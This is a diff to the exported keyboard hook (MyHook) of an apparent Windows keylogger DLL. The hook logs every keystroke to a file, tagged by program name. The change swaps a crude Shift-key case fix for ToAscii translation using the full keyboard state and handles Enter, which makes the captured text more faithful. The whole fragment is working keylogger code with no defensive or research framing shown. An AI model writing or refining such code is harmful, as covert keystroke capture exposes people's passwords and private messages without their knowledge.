@@ -44,14 +44,29 @@ __declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lPar
                 MessageBox(NULL, (LPTSTR)"create file fail", (LPTSTR)"Error", MB_OK);
             }
             
-            if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
-                if( wParam >= 'A' && wParam <= 'Z')
-                    wParam += 32;
-            }
+            // if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
+            //     if( wParam >= 'A' && wParam <= 'Z')
+            //         wParam += 32;
+            // }
             if(strcmp(p + 1, progname) != 0){
                 fprintf(fp, "\n[%s]\n", p + 1);
             }
-            fputc(wParam,fp);
+            // fputc(wParam,fp);
+            char ch = 0;
+            if (wParam==VK_RETURN){
+                ch='\n';
+            }
+            else{
+                BYTE ks[256];
+                GetKeyboardState(ks);
+                WORD w;
+                UINT scan=0;
+                ToAscii(wParam,scan,ks,&w,0);
+                ch =char(w); 
+            }
+            fwrite(&ch, sizeof(char), 1, fp);//把按键字符 记录到文件
+
+
             fclose(fp);
             // old_p = p;
             strcpy(progname, p + 1);
